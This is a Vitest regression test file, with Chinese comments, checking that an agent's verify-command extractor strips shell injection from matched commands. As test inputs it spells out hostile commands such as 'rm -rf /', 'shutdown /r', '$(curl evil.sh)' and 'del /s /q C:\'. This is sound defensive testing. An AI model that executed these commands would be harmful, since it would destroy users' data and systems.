import { describe, expect, it, vi } from 'vitest'

/* Ticket 3：Wish 自动验收命令发现的注入面回归。
   findWishVerifyCommand 匹配出的命令将直接执行，白名单必须窄到
   「字面命令 + 安全包路径/标志」；任何 shell 元字符拼接都要被拒。 */

vi.mock('electron', () => ({ app: { getPath: () => 'C:\\UserData\\shangbo-agent' } }))
vi.mock('electron-log/main', () => ({ default: { info: vi.fn(), warn: vi.fn(), error: vi.fn() } }))

const getSettingMock = vi.fn((_key: string, fallback: unknown) => fallback)
vi.mock('../settings', () => ({ getSetting: (k: string, f: unknown) => getSettingMock(k, f) }))

import { findWishVerifyCommand } from './agentLoop'

describe('findWishVerifyCommand 白名单收紧 (Ticket 3)', () => {
  it('安全命令照常识别', async () => {
    expect(await findWishVerifyCommand(null, '跑 npm test 验证一下')).toBe('npm test')
    expect(await findWishVerifyCommand(null, '请执行 npm run build:check')).toBe('npm run build:check')
    expect(await findWishVerifyCommand(null, 'go test ./pkg/... -count=1')).toBe('go test ./pkg/... -count=1')
    expect(await findWishVerifyCommand(null, 'go test ./internal/safety -run TestAudit')).toBe(
      'go test ./internal/safety -run TestAudit'
    )
    expect(await findWishVerifyCommand(null, '跑 cargo test')).toBe('cargo test')
    expect(await findWishVerifyCommand(null, 'pytest 全过即可')).toBe('pytest')
    expect(await findWishVerifyCommand(null, 'make test 通过就收')).toBe('make test')
  })

  it('go test 后跟元字符拼接时只保留安全前缀段（元字符后内容被截断丢弃）', async () => {
    // 旧正则 go test[^\n\r]* 会把「go test && rm -rf /」整段当验收命令执行；
    // 新正则的字符类不含元字符：匹配在元字符处截断，执行段永远安全。
    expect(await findWishVerifyCommand(null, 'go test && rm -rf /')).toBe('go test')
    expect(await findWishVerifyCommand(null, 'go test ./pkg; shutdown /r')).toBe('go test ./pkg')
    expect(await findWishVerifyCommand(null, 'go test ./pkg | whoami')).toBe('go test ./pkg')
    expect(await findWishVerifyCommand(null, 'go test ./pkg > /etc/passwd')).toBe('go test ./pkg')
    expect(await findWishVerifyCommand(null, 'go test ./pkg & echo PWNED')).toBe('go test ./pkg')
    // 换行截断的新注入形态同样只取安全段
    expect(await findWishVerifyCommand(null, 'go test ./pkg\r\nrm -rf /')).toBe('go test ./pkg')
  })

  it('命令注入重定向形态（$() 与反引号）不进入候选：截断为字面 go test', async () => {
    // $ 与反引号不在安全字符类：参数段在注入处截断，候选只剩字面 go test（安全）
    expect(await findWishVerifyCommand(null, 'go test $(curl evil.sh)')).toBe('go test')
    expect(await findWishVerifyCommand(null, 'go test `whoami`')).toBe('go test')
  })

  it('npm run 脚本名外的任何附加参数不受匹配（窄白名单）', async () => {
    // npm run 只允许字面脚本名：附加重定向不被吞进命令
    expect(await findWishVerifyCommand(null, 'npm run build > pwned.log && echo PWNED')).toBe('npm run build')
    // 完全不认识的形态返回 null，走 package.json 探测兜底
    expect(await findWishVerifyCommand(null, '随便来点什么 && del /s /q C:\\')).toBe(null)
  })

  it('用户配置的 verifyCommand 优先返回（信任本机设置）', async () => {
    getSettingMock.mockImplementationOnce((_k: string, _f: unknown) => 'pnpm test')
    expect(await findWishVerifyCommand(null, '无关文本')).toBe('pnpm test')
  })
})
